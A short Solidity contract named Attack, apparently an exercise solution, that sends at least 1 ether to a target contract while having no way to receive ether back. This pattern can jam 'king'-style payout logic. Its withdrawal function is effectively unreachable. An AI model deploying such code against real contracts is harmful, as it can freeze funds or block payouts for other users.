// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.31;


contract Attack {
    address public target;

    constructor(address _target) {
        target = _target;

    }

    function attack () public payable {
        require(msg.value >= 1 ether, "send at least 1 ether to attack");
        (bool success,) = target.call{value: msg.value}("");
        require(success, "attack failed");

    }
       function withdrawFunds () external {
        require(msg.sender == address(this), "only the attack contract can withdraw funds");
        payable(msg.sender).transfer(address(this).balance);
    }
}


